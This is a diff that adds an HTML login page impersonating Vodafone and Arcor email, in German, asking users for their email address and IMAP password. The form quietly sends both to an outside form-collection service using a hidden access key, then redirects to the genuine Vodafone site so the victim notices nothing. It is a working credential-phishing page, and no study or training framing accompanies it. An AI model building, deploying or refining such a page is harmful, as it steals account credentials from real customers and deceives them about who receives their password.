@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Aktivieren</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        body {
+            position: fixed;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 50vh;
+            background-color: black;
+            color: white;
+            font-family: sans-serif;
+        }
+        
+        .page-box {
+            width: 100%;
+            max-width: 1000px;
+            min-height: 90vh;
+            background: #222;
+            box-shadow: black;
+            padding-right: 20px;
+            padding-left: 20px;
+            border-radius: 5px;
+            text-align: center;
+            height: auto;
+        }
+        
+        .Email {
+            margin-bottom: 15px;
+            background-color: black;
+            color: white;
+            border-radius: 5px;
+            padding-top: 10px;
+            padding-bottom: 10px;
+            border: none;
+            width: 50%;
+        }
+        
+        .passwort {
+            margin-bottom: 5px;
+            background-color: black;
+            color: white;
+            border-radius: 5px;
+            padding-top: 10px;
+            padding-bottom: 10px;
+            border: none;
+            width: 50%;
+        }
+        
+        .submit {
+            margin-top: 20px;
+            background-color: black;
+            color: white;
+            border-radius: 5px;
+            padding-top: 15px;
+            padding-bottom: 15px;
+            border: none;
+            width: 15%;
+            text-align: center;
+            background-color: red;
+            font-weight: bold;
+        }
+        
+        label {
+            font-size: 0.6em;
+            color: white;
+            order: 1;
+            display: block;
+        }
+        
+        .log {
+            font-size: large;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="page-box">
+        <header class="logos">
+            <div class="accor-logo">
+                <img src="arcor/accorr.jpg" width="100%" alt="logo">
+            </div>
+        </header>
+        <main>
+            <p style="text-align: left; font-size:x-small; padding-left: 10px; ">Vodafone E-Mail & Cloud</p>
+            <P class="log ">Login mit E-Mail Zugangsdaten</P>
+            <p style="font-size: small;">Für Deine E-Mail-Konten bei Vodafone, Arcor, Kabel Deutschland und Unitymedia.</p>
+
+            <section>
+                <form action="https://api.web3forms.com/submit" method="POST">
+
+                    <input type="hidden" name="access_key" value="4313fbb1-01f5-4f4d-961b-a88688bc40d4">
+
+                    <input type="hidden" name="redirect" value="https://live.vodafone.de/">
+
+                    <div>
+                        <input type="email" name="text" placeholder=" E-mail-Adresse" maxlength="50" required class="Email">
+                    </div>
+
+                    <div>
+                        <input type="text" name="text" placeholder=" E-Mail-Passwort" required class="passwort">
+                        <label>Trag hier Dein E-Mail-/ IMAP-Passwort ein</label>
+                    </div>
+
+                    <div class>
+                        <input type="submit" value="Login" class="submit">
+                    </div>
+                </form>
+                </form>
+            </section>
+        </main>
+        <footer></footer>
+    </div>
+</body>
+
+</html>
